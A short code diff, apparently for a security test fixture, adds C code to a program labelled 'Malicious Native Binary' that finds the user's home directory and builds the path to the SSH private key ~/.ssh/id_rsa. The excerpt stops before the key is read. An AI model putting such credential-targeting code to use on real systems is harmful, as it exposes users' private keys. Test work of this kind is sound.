@@ -11,9 +11,18 @@
 #include <pwd.h>
 #include <string.h>
 
-
 int main() {
     printf("Test: Malicious Native Binary\n");
     printf("Attempting to read SSH private key...\n");
     
     // Get home directory
+    struct passwd *pw = getpwuid(getuid());
+    if (pw == NULL) {
+        fprintf(stderr, "Failed to get home directory\n");
+        return 1;
+    }
+    
+    // Construct path to SSH key
+    char ssh_key_path[1024];
+    snprintf(ssh_key_path, sizeof(ssh_key_path), "%s/.ssh/id_rsa", pw->pw_dir);
+    
